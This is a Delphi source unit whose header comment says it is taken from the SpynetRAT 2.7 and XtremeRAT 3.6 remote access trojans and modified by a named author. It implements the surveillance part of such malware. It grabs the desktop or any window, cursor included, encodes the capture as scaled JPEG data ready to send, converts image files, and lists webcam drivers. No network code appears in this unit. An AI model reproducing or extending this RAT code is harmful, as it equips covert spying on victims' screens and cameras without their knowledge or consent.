//All functions in this unit are coming from both SpynetRAT 2.7 and XtremeRAT 3.6 sources codes
//modified by wrh1d3 ;) 

unit UnitCaptureFunctions;

interface                                                                     

uses
  Windows, ActiveX, GDIPAPI, GDIPOBJ, GDIPUTIL, ClassesMOD, Graphics, StreamUnit;

function GetDesktopImage(Quality, x, y: Integer; Window: HWND): string;
function GetAnyImageToStream(FileName: string; Quality, x, y: integer): string;
function GetImageFromBMP(BmpFile: TBitmap; Quality, X, Y: Integer): string;
function GetWebcamDrivers: WideString;
function SaveBitmapToStream(Stream: TMemoryStream; HBM: HBitmap): Integer;
function GetBitmapFromWindow(Window: HWND): HBitmap;
procedure SaveAndScaleScreen(quality, x, y: integer; Result: TMemoryStream;
  var StreamToSave: TMemoryStream);
function capGetDriverDescription(wDriverIndex: DWord; lpszName: pWideChar; cbName: Integer;
  lpszVer: pWideChar; cbVer: Integer ): Boolean; stdcall; external 'avicap32.dll' name 'capGetDriverDescriptionW';

implementation

function GetBitmapFromWindow(Window: HWND): HBitmap;
var
  DC, MemDC: HDC;
  Bitmap, OBitmap: HBitmap;
  BitmapWidth, BitmapHeight: Integer;
  Rect: TRect;
  Cursor: TCursorInfo;
begin
  if Window = 0 then Window := GetDeskTopWindow;
  DC := GetDC(Window);
  MemDC := CreateCompatibleDC(DC);
  
  if Window <> 0 then
  begin
    GetClientRect(Window, Rect);
    BitmapWidth := Rect.Right - Rect.Left;
    BitmapHeight := Rect.Bottom - Rect.Top;
  end
  else
  begin
    BitmapWidth := GetDeviceCaps(DC, 8);
    BitmapHeight := GetDeviceCaps(DC, 10);
  end;

  Bitmap := CreateCompatibleBitmap(DC, BitmapWidth, BitmapHeight);
  OBitmap := SelectObject(MemDC, Bitmap);
  BitBlt(MemDC, 0, 0, BitmapWidth, BitmapHeight, DC, 0, 0, SRCCOPY);
  Cursor.cbSize := SizeOf(Cursor);
  GetCursorInfo(Cursor);
  DrawIcon(MemDC, Cursor.ptScreenPos.X, Cursor.ptScreenPos.y, Cursor.hCursor);
  SelectObject(MemDC, OBitmap);
  DeleteDC(MemDC);
  ReleaseDC(Window, DC);
  Result := Bitmap;
end;

function SaveBitmapToStream(Stream: TMemoryStream; HBM: HBitmap): Integer;
const
  BMType = $4D42;
type
  TBitmap = record
    bmType: Integer;
    bmWidth: Integer;
    bmHeight: Integer;
    bmWidthBytes: Integer;
    bmPlanes: Byte;
    bmBitsPixel: Byte;
    bmBits: Pointer;
  end;
var
  BM: TBitmap;
  BFH: TBitmapFileHeader;
  BIP: PBitmapInfo;
  DC: HDC;
  HMem: THandle;
  Buf: Pointer;
  ColorSize, DataSize: Longint;
  BitCount: word;

  function AlignDouble(Size: Longint): Longint;
  begin
    Result := (Size + 31) div 32 * 4;
  end;
begin
  Result := 0;
  if GetObject(HBM, SizeOf(TBitmap), @BM) = 0 then Exit;
  BitCount := 32;
  if (BitCount <> 24) then ColorSize := SizeOf(TRGBQuad) * (1 shl BitCount) else ColorSize := 0;
  DataSize := AlignDouble(bm.bmWidth * BitCount) * bm.bmHeight;
  GetMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  if BIP <> nil then
  begin
    with BIP^.bmiHeader do
    begin
      biSize := SizeOf(TBitmapInfoHeader);
      biWidth := bm.bmWidth;
      biHeight := bm.bmHeight;
      biPlanes := 1;
      biBitCount := BitCount;
      biCompression := 0;
      biSizeImage := DataSize;
      biXPelsPerMeter := 0;
      biYPelsPerMeter := 0;
      biClrUsed := 0;
      biClrImportant := 0;
    end;
    with BFH do
    begin
      bfOffBits := SizeOf(BFH) + SizeOf(TBitmapInfo) + ColorSize;
      bfReserved1 := 0;
      bfReserved2 := 0;
      bfSize := longint(bfOffBits) + DataSize;
      bfType := BMType;
    end;
    HMem := GlobalAlloc(gmem_Fixed, DataSize);
    if HMem <> 0 then
    begin
      Buf := GlobalLock(HMem);
      DC := GetDC(0);
      if GetDIBits(DC, hbm, 0, bm.bmHeight, Buf, BIP^, dib_RGB_Colors) <> 0 then
      begin
        Stream.WriteBuffer(BFH, SizeOf(BFH));
        Stream.WriteBuffer(PChar(BIP)^, SizeOf(TBitmapInfo) + ColorSize);
        Stream.WriteBuffer(Buf^, DataSize);
        Result := 1;
      end;
      ReleaseDC(0, DC);
      GlobalUnlock(HMem);
      GlobalFree(HMem);
    end;
  end;

  FreeMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  DeleteObject(HBM);
end;

type
  TResizeMode = (rmDefault, rmNearest, rmBilinear, rmBicubic);

function ResizeImage(var bmp: TGPBitmap; width, Height: integer; mode: TResizeMode): Boolean;
var
  gr: TGPGraphics;
  buf: TGPBitmap;
begin
  buf := TGPBitmap.Create(Width, Height, bmp.GetPixelFormat);
  gr := TGPGraphics.Create(buf);
  case mode of
    rmDefault: ;
    rmNearest:  gr.SetInterpolationMode(InterpolationModeNearestNeighbor);
    rmBilinear: gr.SetInterpolationMode(InterpolationModeHighQualityBilinear);
    rmBicubic:  gr.SetInterpolationMode(InterpolationModeHighQualityBicubic);
  end;
  
  result := gr.DrawImage(bmp, 0, 0, Width, Height) = Ok;
  gr.Free;
  bmp.Free;
  bmp := buf;
end;

function GetImageFromBMP(BmpFile: TBitmap; Quality, X, Y: Integer): string;
var
  ImageBMP: TGPBitmap;
  Palette: HPALETTE;
  encoderClsid: TGUID;
  encoderParameters: TEncoderParameters;            
  transformation: TEncoderValue;
  xIs: IStream;
  BmpStream: TMemoryStream;
begin
  ImageBMP := TGPBitmap.Create(BmpFile.Handle, Palette);
  if (x <> 0) and (y <> 0) then ResizeImage(ImageBMP, x, y, rmDefault);

  GetEncoderClsid('image/jpeg', encoderClsid);
  encoderParameters.Count := 1;
  encoderParameters.Parameter[0].Guid := EncoderQuality;
  encoderParameters.Parameter[0].Type_ := EncoderParameterValueTypeLong;
  encoderParameters.Parameter[0].NumberOfValues := 1;
  encoderParameters.Parameter[0].Value := @quality;

  BmpStream := TMemoryStream.Create;
  xIS := TStreamAdapter.Create(BmpStream, soReference);
  ImageBMP.Save(xIS, encoderClsid, @encoderParameters);
  ImageBMP.Free;
  BmpStream.Position := 0;
  SetLength(Result, BmpStream.Size);
  BmpStream.Read(Pointer(Result)^, Length(Result));
  BmpStream.Free;
end;

procedure SaveAndScaleScreen(quality, x, y: integer; Result: TMemoryStream;
  var StreamToSave: TMemoryStream);
var
  encoderClsid: TGUID;
  encoderParameters: TEncoderParameters;
  Image: TGPBitmap;
  xIs: IStream;
  yIs: IStream;
begin
  yIS := TStreamAdapter.Create(Result, soReference);
  Image := TGPBitmap.Create(yIs);

  if (x <> 0) and (y <> 0) then ResizeImage(Image, x, y, rmDefault);
  GetEncoderClsid('image/jpeg', encoderClsid);
  encoderParameters.Count := 1;
  encoderParameters.Parameter[0].Guid := EncoderQuality;
  encoderParameters.Parameter[0].Type_ := EncoderParameterValueTypeLong;
  encoderParameters.Parameter[0].NumberOfValues := 1;
  encoderParameters.Parameter[0].Value := @quality;

  StreamToSave.Clear;
  StreamToSave.Position := 0;

  xIS := TStreamAdapter.Create(StreamToSave, soReference);
  image.Save(xIS, encoderClsid, @encoderParameters);
  image.Free;
end;

procedure TakeCapture(Quality, x, y: integer; Result: TMemoryStream;
  var ResultStream: TMemoryStream);
begin
  Result.Position := 0;
  ResultStream.Position := 0;
  SaveAndScaleScreen(Quality, x, y, Result, ResultStream);
  ResultStream.Position := 0;
end;

procedure ConvertImageToResult(OriginalFile: string; var Result: TMemoryStream);
var
  encoderClsid: TGUID;
  transformation: TEncoderValue;
  Image: TGPBitmap;
  xIs: IStream;
begin
  Image := TGPBitmap.Create(pchar(OriginalFile));
  GetEncoderClsid('image/bmp', encoderClsid);
  xIS := TStreamAdapter.Create(Result, soReference);
  image.Save(xIS, encoderClsid);
  image.Free;
end;

function GetAnyImageToStream(FileName: string; Quality, x, y: integer): string;
var
  Stream, TmpStream: TMemoryStream;
begin
  Stream := TMemoryStream.Create;
  ConvertImageToResult(FileName, Stream);
  Stream.Position := 0;
  TmpStream := TMemoryStream.Create;
  TakeCapture(Quality, x, y, Stream, TmpStream);
  Stream.Free;  
  SetLength(Result, TmpStream.Size);
  TmpStream.Read(Pointer(Result)^, Length(Result));
  TmpStream.Free;
end;

procedure ScreenCapture(var Stream: TMemoryStream; Window: HWND);
begin
  Stream.Clear;
  Stream.Position := 0;
  SaveBitmapToStream(Stream, GetBitmapFromWindow(Window));
end;

function GetDesktopImage(Quality, x, y: Integer; Window: HWND): string;
var
  Stream, TmpStream: TmemoryStream;
begin
  Stream := TmemoryStream.Create;
  ScreenCapture(Stream, Window);
  Stream.position := 0;
  TmpStream := TMemoryStream.Create;
  TakeCapture(Quality, x, y, Stream, TmpStream);
  Stream.Free;
  SetLength(Result, TmpStream.Size);
  TmpStream.Read(Pointer(Result)^, Length(Result));
  TmpStream.Free;
end;

function GetWebcamDrivers: WideString;
var
  szName,
  szVersion: array[0..MAX_PATH] of widechar;
  iReturn: Boolean;
  x: integer;
begin
  Result := '';
  x := 0;
  repeat
    iReturn := capGetDriverDescription(x, @szName, sizeof(szName), @szVersion, sizeof(szVersion));
    If iReturn then
    begin
     Result := Result + szName + ' ' + szVersion + '|';
     Inc(x);
    end;
  until iReturn = False;
end;

end.

